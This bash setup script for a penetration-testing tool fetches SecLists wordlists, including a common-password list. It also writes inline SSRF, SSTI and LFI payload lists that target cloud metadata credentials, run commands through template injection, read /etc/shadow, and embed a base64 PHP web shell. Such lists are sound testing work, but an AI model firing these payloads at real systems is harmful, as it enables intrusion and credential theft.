#!/usr/bin/env bash
# WhiteHatHacker AI — Wordlist Setup Script
# Downloads essential wordlists from SecLists and other sources
set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
WORDLISTS="${PROJECT_DIR}/data/wordlists"
PAYLOADS="${WORDLISTS}/payloads"

mkdir -p "$WORDLISTS" "$PAYLOADS"

# --- SecLists ---
SECLISTS_DIR="/usr/share/seclists"
if [[ ! -d "$SECLISTS_DIR" ]]; then
    info "Installing SecLists..."
    sudo apt-get install -y -qq seclists 2>/dev/null || {
        info "Cloning SecLists from GitHub..."
        SECLISTS_DIR="/opt/SecLists"
        sudo git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$SECLISTS_DIR" 2>/dev/null || \
            warn "SecLists clone failed"
    }
fi

# --- Copy/symlink essential wordlists ---
info "Setting up directory wordlists..."
if [[ -f "${SECLISTS_DIR}/Discovery/Web-Content/directory-list-2.3-medium.txt" ]]; then
    cp -n "${SECLISTS_DIR}/Discovery/Web-Content/directory-list-2.3-medium.txt" "${WORDLISTS}/directories.txt" 2>/dev/null || true
    info "  ✓ directories.txt"
fi

info "Setting up subdomain wordlists..."
if [[ -f "${SECLISTS_DIR}/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
    cp -n "${SECLISTS_DIR}/Discovery/DNS/subdomains-top1million-5000.txt" "${WORDLISTS}/subdomains.txt" 2>/dev/null || true
    info "  ✓ subdomains.txt"
fi

info "Setting up parameter wordlists..."
if [[ -f "${SECLISTS_DIR}/Discovery/Web-Content/burp-parameter-names.txt" ]]; then
    cp -n "${SECLISTS_DIR}/Discovery/Web-Content/burp-parameter-names.txt" "${WORDLISTS}/parameters.txt" 2>/dev/null || true
    info "  ✓ parameters.txt"
fi

info "Setting up password wordlists..."
if [[ -f "${SECLISTS_DIR}/Passwords/Common-Credentials/10k-most-common.txt" ]]; then
    cp -n "${SECLISTS_DIR}/Passwords/Common-Credentials/10k-most-common.txt" "${WORDLISTS}/passwords.txt" 2>/dev/null || true
    info "  ✓ passwords.txt"
fi

# --- Payload wordlists ---
info "Setting up payload wordlists..."

# XSS payloads
if [[ -f "${SECLISTS_DIR}/Fuzzing/XSS/XSS-BruteLogic.txt" ]]; then
    cp -n "${SECLISTS_DIR}/Fuzzing/XSS/XSS-BruteLogic.txt" "${PAYLOADS}/xss.txt" 2>/dev/null || true
elif [[ -f "${SECLISTS_DIR}/Fuzzing/XSS-Fuzzing" ]]; then
    cat "${SECLISTS_DIR}"/Fuzzing/XSS/*.txt > "${PAYLOADS}/xss.txt" 2>/dev/null || true
fi
info "  ✓ payloads/xss.txt"

# SQLi payloads
if [[ -f "${SECLISTS_DIR}/Fuzzing/SQLi/Generic-SQLi.txt" ]]; then
    cp -n "${SECLISTS_DIR}/Fuzzing/SQLi/Generic-SQLi.txt" "${PAYLOADS}/sqli.txt" 2>/dev/null || true
fi
info "  ✓ payloads/sqli.txt"

# SSRF payloads
cat > "${PAYLOADS}/ssrf.txt" << 'SSRF_EOF'
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/metadata/v1/
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:9200
http://127.0.0.1:6379
http://127.0.0.1:27017
http://0177.0.0.1
http://2130706433
http://0x7f000001
SSRF_EOF
info "  ✓ payloads/ssrf.txt"

# SSTI payloads
cat > "${PAYLOADS}/ssti.txt" << 'SSTI_EOF'
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
{{''.__class__.__mro__[2].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{%import os%}{{os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{''.__class__.mro()[1].__subclasses__()}}
${{<%[%'"}}%\
SSTI_EOF
info "  ✓ payloads/ssti.txt"

# LFI payloads
cat > "${PAYLOADS}/lfi.txt" << 'LFI_EOF'
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/nginx/access.log
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
file:///etc/passwd
expect://id
LFI_EOF
info "  ✓ payloads/lfi.txt"

echo ""
info "=== Wordlist Summary ==="
for f in "$WORDLISTS"/*.txt; do
    [[ -f "$f" ]] && info "  $(basename "$f"): $(wc -l < "$f") lines"
done
for f in "$PAYLOADS"/*.txt; do
    [[ -f "$f" ]] && info "  payloads/$(basename "$f"): $(wc -l < "$f") lines"
done

info "Wordlist setup complete."
